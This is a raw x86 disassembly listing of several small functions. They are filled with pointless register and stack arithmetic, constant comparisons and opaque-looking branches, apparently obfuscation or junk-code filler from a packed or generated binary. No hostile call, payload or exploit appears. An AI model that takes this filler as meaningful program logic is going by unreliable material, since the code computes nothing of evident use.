  417a71:	jne    0x417b3e
  417a77:	add    eax,ecx
  417a79:	mov    esi,DWORD PTR [ebp-0xc]
  417a7c:	mov    ecx,DWORD PTR [ebp-0xc]
  417a7f:	test   ebx,0x96
  417a85:	jne    0x417b3e
  417a8b:	or     DWORD PTR [ebp-0xc],eax
  417a8e:	xor    eax,eax
  417a90:	mov    ebx,DWORD PTR [ebp-0xc]
  417a93:	or     ebx,eax
  417a95:	sub    edx,edi
  417a97:	cmp    ecx,DWORD PTR [ebp-0x4]
  417a9a:	je     0x417b3e
  417aa0:	mov    edi,DWORD PTR [ebp-0xc]
  417aa3:	mov    eax,DWORD PTR [ebp-0xc]
  417aa6:	test   ecx,0x9b
  417aac:	jne    0x417b3e
  417ab2:	add    DWORD PTR [ebp-0xc],ecx
  417ab5:	cmp    edx,ecx
  417ab7:	je     0x417b3e
  417abd:	sub    DWORD PTR [ebp-0xc],edx
  417ac0:	mov    edx,DWORD PTR [ebp-0xc]
  417ac3:	cmp    eax,DWORD PTR [ebp-0x14]
  417ac6:	je     0x417b3e
  417ac8:	mov    ecx,0x33
  417acd:	and    eax,edi
  417acf:	and    DWORD PTR [ebp-0xc],edx
  417ad2:	add    ebx,ecx
  417ad4:	sub    ebx,edi
  417ad6:	xor    DWORD PTR [ebp-0xc],esi
  417ad9:	mov    edx,DWORD PTR [ebp-0xc]
  417adc:	and    edx,ebx
  417ade:	cmp    edx,DWORD PTR ds:0x42b080
  417ae4:	jne    0x417b3e
  417ae6:	mov    ecx,0xf7
  417aeb:	add    edx,eax
  417aed:	add    ecx,esi
  417aef:	cmp    edx,ebx
  417af1:	je     0x417b3e
  417af3:	sub    DWORD PTR [ebp-0xc],edx
  417af6:	sub    ecx,edi
  417af8:	mov    ebx,DWORD PTR [ebp-0xc]
  417afb:	mov    edx,DWORD PTR ds:0x42b064
  417b01:	or     DWORD PTR [ebp-0xc],ebx
  417b04:	add    DWORD PTR [ebp-0xc],ecx
  417b07:	and    edx,edi
  417b09:	add    edx,edx
  417b0b:	cmp    edx,DWORD PTR ds:0x42b064
  417b11:	jne    0x417b3e
  417b13:	mov    esi,edx
  417b15:	mov    ecx,DWORD PTR [ebp-0xc]
  417b18:	cmp    ebx,esi
  417b1a:	jne    0x417b3e
  417b1c:	cmp    edx,0xffffffb8
  417b1f:	jne    0x417b3e
  417b21:	mov    eax,DWORD PTR ds:0x42b064
  417b27:	add    DWORD PTR [ebp-0xc],esi
  417b2a:	sub    DWORD PTR [ebp-0xc],eax
  417b2d:	test   ecx,0x6f
  417b33:	jne    0x417b3e
  417b35:	add    ecx,edx
  417b37:	sub    ecx,eax
  417b39:	add    ecx,esi
  417b3b:	add    DWORD PTR [ebp-0xc],ecx
  417b3e:	sub    esi,edi
  417b40:	mov    eax,DWORD PTR [ebp-0xc]
  417b43:	mov    ebx,0xba
  417b48:	add    ebx,ebx
  417b4a:	sub    eax,edi
  417b4c:	sub    DWORD PTR [ebp-0xc],esi
  417b4f:	test   ecx,0x84
  417b55:	je     0x417bc5
  417b57:	mov    DWORD PTR [ebp-0xc],ebx
  417b5a:	mov    edi,0x6e
  417b5f:	mov    ecx,0xb33f
  417b64:	add    edi,ecx
  417b66:	sub    eax,edx
  417b68:	add    edi,esi
  417b6a:	add    edi,edi
  417b6c:	sub    eax,esi
  417b6e:	cmp    edi,0x41a0
  417b74:	je     0x417bc5
  417b76:	mov    ecx,DWORD PTR [ebp-0xc]
  417b79:	mov    ebx,DWORD PTR [ebp-0xc]
  417b7c:	cmp    ecx,DWORD PTR ds:0x42b080
  417b82:	jne    0x417bc5
  417b84:	cmp    edi,DWORD PTR ds:0x42b064
  417b8a:	jne    0x417bc5
  417b8c:	mov    edx,DWORD PTR ds:0x42b064
  417b92:	sub    ebx,edx
  417b94:	add    DWORD PTR [ebp-0xc],ebx
  417b97:	xor    esi,esi
  417b99:	add    DWORD PTR [ebp-0xc],eax
  417b9c:	cmp    edi,0x14
  417b9f:	je     0x417bc5
  417ba1:	cmp    ecx,DWORD PTR [ebp-0x4]
  417ba4:	je     0x417bc5
  417ba6:	cmp    edi,0x40
  417ba9:	jne    0x417bc5
  417bab:	sub    esi,edx
  417bad:	mov    eax,0x54
  417bb2:	and    esi,ebx
  417bb4:	mov    ebx,DWORD PTR [ebp-0xc]
  417bb7:	sub    DWORD PTR [ebp-0xc],edi
  417bba:	add    ebx,ecx
  417bbc:	add    DWORD PTR [ebp-0xc],esi
  417bbf:	and    DWORD PTR [ebp-0xc],eax
  417bc2:	sub    DWORD PTR [ebp-0xc],ebx
  417bc5:	pop    edi
  417bc6:	mov    eax,0x8f
  417bcb:	mov    ecx,DWORD PTR [ebp-0xc]
  417bce:	sub    ecx,ebx
  417bd0:	sub    DWORD PTR [ebp-0xc],eax
  417bd3:	mov    DWORD PTR [ebp-0xc],edi
  417bd6:	and    ecx,edi
  417bd8:	sub    DWORD PTR [ebp-0xc],eax
  417bdb:	or     DWORD PTR [ebp-0xc],edi
  417bde:	add    ecx,ecx
  417be0:	sub    ecx,edi
  417be2:	and    DWORD PTR [ebp-0xc],ecx
  417be5:	pop    esi
  417be6:	test   esi,0x40048300
  417bec:	jne    0x417bfe
  417bee:	cmp    esi,0xffffff9c
  417bf1:	jne    0x417bfe
  417bf3:	cmp    esi,DWORD PTR ds:0x42b064
  417bf9:	jne    0x417bfe
  417bfb:	add    DWORD PTR [ebp-0xc],esi
  417bfe:	pop    ebx
  417bff:	mov    eax,DWORD PTR ds:0x42b064
  417c05:	sub    eax,esi
  417c07:	add    DWORD PTR [ebp-0xc],ebx
  417c0a:	mov    ecx,0x6e89
  417c0f:	and    eax,edi
  417c11:	and    DWORD PTR [ebp-0xc],eax
  417c14:	sub    ecx,edi
  417c16:	and    ecx,edi
  417c18:	or     DWORD PTR [ebp-0xc],ecx
  417c1b:	leave  
  417c1c:	ret    
  417c1d:	int3   
  417c1e:	int3   
  417c1f:	int3   
  417c20:	int3   
  417c21:	int3   
  417c22:	push   ebp
  417c23:	mov    ebp,esp
  417c25:	sub    esp,0x3c
  417c28:	xor    eax,eax
  417c2a:	mov    ecx,eax
  417c2c:	or     ecx,eax
  417c2e:	mov    DWORD PTR [ebp-0x8],ecx
  417c31:	push   ebx
  417c32:	sub    DWORD PTR [ebp-0x8],eax
  417c35:	push   esi
  417c36:	add    ecx,eax
  417c38:	sub    DWORD PTR [ebp-0x8],ecx
  417c3b:	push   edi
  417c3c:	mov    eax,0x47
  417c41:	sub    eax,ecx
  417c43:	sub    eax,ecx
  417c45:	mov    ecx,eax
  417c47:	add    ecx,ecx
  417c49:	add    DWORD PTR [ebp-0x8],eax
  417c4c:	add    ecx,ecx
  417c4e:	sub    eax,ecx
  417c50:	add    eax,eax
  417c52:	sub    ecx,eax
  417c54:	add    eax,eax
  417c56:	and    ecx,eax
  417c58:	sub    DWORD PTR [ebp-0x8],ecx
  417c5b:	add    eax,ecx
  417c5d:	mov    edx,DWORD PTR [ebp-0x8]
  417c60:	mov    DWORD PTR [ebp-0x8],ecx
  417c63:	cmp    edx,DWORD PTR [ebp-0x18]
  417c66:	jne    0x417cbb
  417c68:	mov    ebx,DWORD PTR [ebp-0x8]
  417c6b:	mov    ecx,DWORD PTR [ebp-0x8]
  417c6e:	add    ebx,edx
  417c70:	add    ecx,ecx
  417c72:	cmp    edx,ecx
  417c74:	jne    0x417cbb
  417c76:	mov    edx,0x37ed
  417c7b:	mov    esi,DWORD PTR [ebp-0x8]
  417c7e:	mov    DWORD PTR [ebp-0x8],edx
  417c81:	add    DWORD PTR [ebp-0x8],ebx
  417c84:	cmp    esi,0x5f30
  417c8a:	je     0x417cbb
  417c8c:	sub    esi,ebx
  417c8e:	mov    eax,DWORD PTR [ebp-0x8]
  417c91:	and    eax,esi
  417c93:	sub    DWORD PTR [ebp-0x8],eax
  417c96:	mov    edx,0x9f
  417c9b:	sub    DWORD PTR [ebp-0x8],edx
  417c9e:	test   ebx,0x7b
  417ca4:	je     0x417cbb
  417ca6:	xor    esi,esi
  417ca8:	or     esi,ebx
  417caa:	mov    edi,DWORD PTR [ebp-0x8]
  417cad:	and    edi,ebx
  417caf:	sub    DWORD PTR [ebp-0x8],edi
  417cb2:	sub    esi,ecx
  417cb4:	add    esi,ecx
  417cb6:	or     esi,ecx
  417cb8:	or     DWORD PTR [ebp-0x8],esi
  417cbb:	mov    esi,DWORD PTR [ebp-0x8]
  417cbe:	sub    esi,edi
  417cc0:	add    DWORD PTR [ebp-0x8],esi
  417cc3:	mov    eax,edi
  417cc5:	add    DWORD PTR [ebp-0x8],esi
  417cc8:	mov    edx,DWORD PTR [ebp-0x8]
  417ccb:	sub    DWORD PTR [ebp-0x8],ecx
  417cce:	mov    DWORD PTR [ebp-0x28],ecx
  417cd1:	xor    DWORD PTR [ebp-0x28],edx
  417cd4:	test   eax,0xc
  417cd9:	jne    0x417ce0
  417cdb:	and    eax,edx
  417cdd:	sub    DWORD PTR [ebp-0x8],eax
  417ce0:	add    esi,edx
  417ce2:	add    DWORD PTR [ebp-0x8],eax
  417ce5:	mov    DWORD PTR [ebp-0x8],ecx
  417ce8:	mov    eax,DWORD PTR ds:0x42b048
  417cee:	mov    edx,DWORD PTR [ebp-0x28]
  417cf1:	add    eax,ecx
  417cf3:	and    edx,ebx
  417cf5:	add    DWORD PTR [ebp-0x8],edx
  417cf8:	sub    DWORD PTR [ebp-0x8],eax
  417cfb:	sub    DWORD PTR [ebp-0x28],esi
  417cfe:	pop    edi
  417cff:	or     eax,esi
  417d01:	xor    edx,edx
  417d03:	mov    ebx,DWORD PTR [ebp-0x28]
  417d06:	xor    DWORD PTR [ebp-0x8],eax
  417d09:	test   ebx,0xbe
  417d0f:	jne    0x417dba
  417d15:	test   edi,0xe7df
  417d1b:	jne    0x417dba
  417d21:	add    ebx,edx
  417d23:	sub    ebx,esi
  417d25:	sub    ebx,ecx
  417d27:	mov    eax,DWORD PTR [ebp-0x28]
  417d2a:	cmp    edi,0x51
  417d2d:	jne    0x417dba
  417d33:	mov    esi,DWORD PTR [ebp-0x8]
  417d36:	mov    ecx,DWORD PTR [ebp-0x28]
  417d39:	test   ebx,0x24c8
  417d3f:	jne    0x417dba
  417d41:	mov    edx,0x25
  417d46:	sub    ebx,edx
  417d48:	sub    ecx,esi
  417d4a:	and    eax,esi
  417d4c:	and    DWORD PTR [ebp-0x8],edi
  417d4f:	or     DWORD PTR [ebp-0x8],eax
  417d52:	cmp    ebx,DWORD PTR [ebp-0x24]
  417d55:	jne    0x417dba
  417d57:	mov    edx,DWORD PTR [ebp-0x8]
  417d5a:	mov    eax,0xbb
  417d5f:	test   ecx,0x98
  417d65:	jne    0x417dba
  417d67:	and    ebx,edx
  417d69:	xor    edx,edx
  417d6b:	mov    esi,0x39
  417d70:	cmp    ecx,ebx
  417d72:	jne    0x417dba
  417d74:	add    edx,eax
  417d76:	mov    eax,DWORD PTR [ebp-0x28]
  417d79:	cmp    edi,DWORD PTR [ebp-0x2c]
  417d7c:	je     0x417dba
  417d7e:	cmp    ebx,DWORD PTR [ebp-0x2c]
  417d81:	je     0x417dba
  417d83:	mov    edx,DWORD PTR [ebp-0x28]
  417d86:	add    esi,ecx
  417d88:	xor    ecx,ecx
  417d8a:	or     ebx,edi
  417d8c:	add    DWORD PTR [ebp-0x8],esi
  417d8f:	cmp    edx,0x960b60
  417d95:	jne    0x417dba
  417d97:	sub    DWORD PTR [ebp-0x8],eax
  417d9a:	mov    eax,DWORD PTR [ebp-0x8]
  417d9d:	add    edx,edx
  417d9f:	add    eax,ebx
  417da1:	add    DWORD PTR [ebp-0x8],eax
  417da4:	xor    ebx,ebx
  417da6:	add    DWORD PTR [ebp-0x8],ebx
  417da9:	sub    ecx,edi
  417dab:	sub    edx,eax
  417dad:	cmp    ecx,0xffffff91
  417db0:	jne    0x417dba
  417db2:	or     DWORD PTR [ebp-0x8],edx
  417db5:	and    ecx,ebx
  417db7:	sub    DWORD PTR [ebp-0x28],ecx
  417dba:	pop    esi
  417dbb:	mov    eax,DWORD PTR [ebp-0x28]
  417dbe:	add    DWORD PTR [ebp-0x28],eax
  417dc1:	pop    ebx
  417dc2:	mov    edx,0x214
  417dc7:	mov    eax,DWORD PTR [ebp-0x28]
  417dca:	sub    edx,edi
  417dcc:	and    edx,esi
  417dce:	sub    eax,ebx
  417dd0:	add    DWORD PTR [ebp-0x8],edx
  417dd3:	add    DWORD PTR [ebp-0x28],eax
  417dd6:	leave  
  417dd7:	ret    
  417dd8:	int3   
  417dd9:	int3   
  417dda:	int3   
  417ddb:	int3   
  417ddc:	int3   
  417ddd:	push   ebp
  417dde:	mov    ebp,esp
  417de0:	sub    esp,0x20
  417de3:	mov    edx,0x9e
  417de8:	mov    eax,0x34
  417ded:	add    eax,edx
  417def:	mov    DWORD PTR [ebp-0x4],eax
  417df2:	push   ebx
  417df3:	add    DWORD PTR [ebp-0x4],edx
  417df6:	push   esi
  417df7:	xor    ebx,ebx
  417df9:	add    ebx,edx
  417dfb:	sub    DWORD PTR [ebp-0x4],edx
  417dfe:	mov    edx,DWORD PTR [ebp-0x4]
  417e01:	sub    ebx,edx
  417e03:	sub    DWORD PTR [ebp-0x4],ebx
  417e06:	push   edi
  417e07:	xor    edx,edx
  417e09:	mov    edi,DWORD PTR [ebp-0x4]
  417e0c:	add    edi,eax
  417e0e:	or     edx,ebx
  417e10:	cmp    edi,0x47
  417e13:	je     0x417e3a
  417e15:	xor    esi,esi
  417e17:	mov    eax,0x3f69
  417e1c:	xor    DWORD PTR [ebp-0x4],edi
  417e1f:	cmp    edi,DWORD PTR [ebp-0x14]
  417e22:	jne    0x417e3a
  417e24:	mov    ebx,0x9
  417e29:	or     edx,esi
  417e2b:	xor    edi,edi
  417e2d:	sub    eax,ebx
  417e2f:	mov    DWORD PTR [ebp-0x10],eax
  417e32:	mov    DWORD PTR [ebp-0x1c],ebx
  417e35:	and    edx,edi
  417e37:	sub    DWORD PTR [ebp-0x10],edx
  417e3a:	sub    eax,edi
  417e3c:	sub    DWORD PTR [ebp-0x4],edx
  417e3f:	add    eax,edx
  417e41:	sub    eax,esi
  417e43:	sub    eax,esi
  417e45:	add    DWORD PTR [ebp-0x4],edi
  417e48:	mov    edx,0x71
  417e4d:	mov    esi,DWORD PTR [ebp-0x4]
  417e50:	add    edx,eax
  417e52:	sub    DWORD PTR [ebp-0x4],edx
  417e55:	sub    DWORD PTR [ebp-0x4],esi
  417e58:	xor    ecx,ecx
  417e5a:	sub    DWORD PTR [ebp-0x4],ecx
  417e5d:	mov    ebx,eax
  417e5f:	sub    ebx,esi
  417e61:	add    DWORD PTR [ebp-0x4],ebx
  417e64:	mov    esi,DWORD PTR [ebp-0x4]
  417e67:	mov    eax,0x50
  417e6c:	cmp    esi,0x47
  417e6f:	je     0x417eb3
  417e71:	or     DWORD PTR [ebp-0x4],esi
  417e74:	sub    eax,ebx
  417e76:	mov    ecx,ebx
  417e78:	add    eax,edi
  417e7a:	xor    edx,edx
  417e7c:	test   eax,0xe6
  417e81:	jne    0x417eb3
  417e83:	mov    edi,0x360a
  417e88:	mov    esi,0x3f
  417e8d:	cmp    eax,0x10
  417e90:	jne    0x417eb3
  417e92:	mov    ebx,0x72014611
  417e97:	and    ebx,eax
  417e99:	or     DWORD PTR [ebp-0x4],ebx
  417e9c:	mov    eax,0x9c
  417ea1:	xor    DWORD PTR [ebp-0x4],eax
  417ea4:	add    edx,edi
  417ea6:	sub    DWORD PTR [ebp-0x4],edx
  417ea9:	add    ecx,edi
  417eab:	sub    ecx,ebx
  417ead:	sub    DWORD PTR [ebp-0x4],ecx
  417eb0:	sub    DWORD PTR [ebp-0x4],esi
  417eb3:	mov    DWORD PTR [ebp-0x4],esi
  417eb6:	pop    edi
  417eb7:	mov    edx,DWORD PTR [ebp-0x4]
  417eba:	cmp    edx,DWORD PTR [ebp-0x1c]
  417ebd:	jne    0x417ee7
  417ebf:	sub    edx,esi
  417ec1:	mov    ecx,0xeb
  417ec6:	mov    DWORD PTR [ebp-0x4],edx
  417ec9:	add    ecx,edx
  417ecb:	sub    ecx,eax
  417ecd:	mov    ebx,DWORD PTR [ebp-0x4]
  417ed0:	add    ebx,edx
  417ed2:	add    ecx,edx
  417ed4:	add    DWORD PTR [ebp-0x4],edi
  417ed7:	or     ecx,ebx
  417ed9:	cmp    ecx,0xffffffa6
  417edc:	jne    0x417ee7
  417ede:	mov    edx,DWORD PTR [ebp-0x4]
  417ee1:	add    DWORD PTR [ebp-0x4],edx
  417ee4:	sub    DWORD PTR [ebp-0x4],ecx
  417ee7:	pop    esi
  417ee8:	or     eax,ecx
  417eea:	and    eax,edx
  417eec:	cmp    edx,0x2a
  417eef:	je     0x417ef4
  417ef1:	add    DWORD PTR [ebp-0x4],eax
  417ef4:	pop    ebx
  417ef5:	sub    DWORD PTR [ebp-0x4],ebx
  417ef8:	leave  
  417ef9:	ret    
  417efa:	int3   
  417efb:	int3   
  417efc:	int3   
  417efd:	int3   
  417efe:	int3   
  417eff:	push   ebp
  417f00:	mov    ebp,esp
  417f02:	sub    esp,0x30
  417f05:	mov    edx,0xb187
  417f0a:	mov    DWORD PTR [ebp-0x4],edx
  417f0d:	push   ebx
  417f0e:	add    edx,edx
  417f10:	mov    eax,0x17
  417f15:	add    edx,eax
  417f17:	mov    ebx,DWORD PTR [ebp-0x4]
  417f1a:	cmp    ebx,0xffffff84
  417f1d:	jne    0x417f22
  417f1f:	add    DWORD PTR [ebp-0x4],ebx
  417f22:	add    DWORD PTR [ebp-0x4],edx
  417f25:	push   esi
  417f26:	mov    esi,edx
  417f28:	add    esi,edx
  417f2a:	or     esi,edx
  417f2c:	and    esi,eax
  417f2e:	add    DWORD PTR [ebp-0x4],esi
  417f31:	push   edi
  417f32:	and    esi,eax
  417f34:	sub    DWORD PTR [ebp-0x4],edx
  417f37:	mov    eax,0xcd86
  417f3c:	mov    ecx,DWORD PTR ds:0x42b050
  417f42:	add    DWORD PTR [ebp-0x4],ecx
  417f45:	sub    esi,eax
  417f47:	sub    esi,eax
  417f49:	mov    DWORD PTR [ebp-0x14],ebx
  417f4c:	or     DWORD PTR [ebp-0x14],esi
  417f4f:	add    DWORD PTR [ebp-0x4],ecx
  417f52:	sub    DWORD PTR [ebp-0x14],edx
  417f55:	sub    ecx,eax
  417f57:	and    esi,eax
  417f59:	sub    esi,ebx
  417f5b:	mov    edi,0xb7
  417f60:	mov    eax,DWORD PTR [ebp-0x14]
  417f63:	add    edi,eax
  417f65:	add    esi,ebx
  417f67:	test   edi,0xba
  417f6d:	jne    0x417fa2
  417f6f:	cmp    esi,eax
  417f71:	je     0x417fa2
  417f73:	mov    edx,ecx
  417f75:	mov    eax,DWORD PTR [ebp-0x4]
  417f78:	and    DWORD PTR [ebp-0x14],edi
  417f7b:	sub    DWORD PTR [ebp-0x4],edx
  417f7e:	add    DWORD PTR [ebp-0x4],esi
  417f81:	cmp    eax,0xffffffba
  417f84:	jne    0x417fa2
  417f86:	cmp    eax,0x6b
  417f89:	je     0x417fa2
  417f8b:	mov    ecx,eax
  417f8d:	xor    eax,eax
  417f8f:	add    DWORD PTR [ebp-0x4],ebx
  417f92:	add    DWORD PTR [ebp-0x4],eax
  417f95:	sub    ecx,edx
  417f97:	cmp    ecx,DWORD PTR ds:0x42b050
  417f9d:	je     0x417fa2
  417f9f:	sub    DWORD PTR [ebp-0x14],ecx
  417fa2:	sub    DWORD PTR [ebp-0x4],edx
  417fa5:	add    esi,edi
  417fa7:	sub    esi,ecx
  417fa9:	sub    esi,edx
  417fab:	mov    ecx,DWORD PTR [ebp-0x4]
  417fae:	mov    edi,DWORD PTR ds:0x42b050
  417fb4:	or     DWORD PTR [ebp-0x14],esi
  417fb7:	add    edi,eax
  417fb9:	add    edi,edi
  417fbb:	and    ecx,ebx
  417fbd:	sub    DWORD PTR [ebp-0x14],ecx
  417fc0:	and    edi,edx
  417fc2:	add    ebx,edx
  417fc4:	cmp    ebx,edx
  417fc6:	jne    0x417fe8
  417fc8:	or     DWORD PTR [ebp-0x14],edi
  417fcb:	sub    DWORD PTR [ebp-0x14],esi
  417fce:	cmp    ebx,DWORD PTR [ebp-0x8]
  417fd1:	je     0x417fe8
  417fd3:	mov    esi,DWORD PTR [ebp-0x4]
  417fd6:	mov    edx,ecx
  417fd8:	sub    ebx,edx
  417fda:	add    DWORD PTR [ebp-0x4],ebx
  417fdd:	test   esi,0xbf
  417fe3:	je     0x417fe8
  417fe5:	xor    DWORD PTR [ebp-0x4],esi
  417fe8:	pop    edi
  417fe9:	sub    DWORD PTR [ebp-0x14],ecx
  417fec:	pop    esi
  417fed:	mov    edx,DWORD PTR ds:0x42b050
  417ff3:	or     edx,eax
  417ff5:	mov    ebx,DWORD PTR [ebp-0x14]
  417ff8:	or     DWORD PTR [ebp-0x4],esi
  417ffb:	sub    DWORD PTR [ebp-0x14],edi
  417ffe:	sub    ebx,edi
  418000:	sub    DWORD PTR [ebp-0x4],ebx
  418003:	sub    DWORD PTR [ebp-0x14],edx
  418006:	pop    ebx
  418007:	sub    eax,ecx
  418009:	mov    ecx,DWORD PTR [ebp-0x14]
  41800c:	sub    ecx,edi
  41800e:	mov    edx,DWORD PTR [ebp-0x4]
  418011:	add    eax,esi
  418013:	cmp    ebx,0xb703
  418019:	jne    0x41804c
  41801b:	sub    ecx,ebx
  41801d:	sub    DWORD PTR [ebp-0x4],eax
  418020:	and    edx,edi
  418022:	add    ecx,ebx
  418024:	and    ecx,esi
  418026:	mov    eax,edi
  418028:	cmp    eax,DWORD PTR ds:0x42b050
  41802e:	je     0x41804c
  418030:	cmp    edx,0x2017
  418036:	je     0x41804c
  418038:	cmp    edx,0x3d
  41803b:	je     0x41804c
  41803d:	sub    DWORD PTR [ebp-0x4],edx
  418040:	add    DWORD PTR [ebp-0x4],ecx
  418043:	sub    eax,edx
  418045:	sub    eax,ecx
  418047:	sub    eax,ebx
  418049:	xor    DWORD PTR [ebp-0x4],eax
  41804c:	leave  
  41804d:	ret    
	...
